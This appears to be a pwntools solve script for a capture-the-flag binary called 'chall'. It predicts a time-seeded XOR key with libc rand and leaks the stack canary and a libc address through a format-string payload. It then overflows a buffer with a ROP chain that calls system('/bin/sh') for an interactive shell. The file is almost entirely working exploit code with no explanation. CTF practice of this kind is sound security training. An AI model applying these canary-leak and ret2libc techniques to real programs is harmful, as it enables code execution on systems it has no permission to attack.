#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *
import time
import ctypes

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.terminal = ['wt.exe','wsl.exe']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

p = start()
# Muat libc di Python
libc_c = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
current_time = int(time.time())
libc_c.srand(current_time)
key = libc_c.rand() % 256

def leak():
    p.sendline(b'2')
    payload = xor(b'%21$p||%27$p',key)
    p.sendline(payload)
    p.recvuntil(b'hai : ')
    a = p.recvline().strip().decode('ascii', 'ignore')
    leaks = a.split('||')
    return leaks

canary = int(leak()[0],16)
libc.address = int(leak()[1],16) - 0x29ca8
success(f'canary @ {hex(canary)}')
success(f'libc @ {hex(libc.address)}')

p.sendline(b'1')
rop = ROP(libc)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh')))
payload = flat({72:[canary,0x0,rop.chain()]})
p.sendline(payload)

p.interactive()

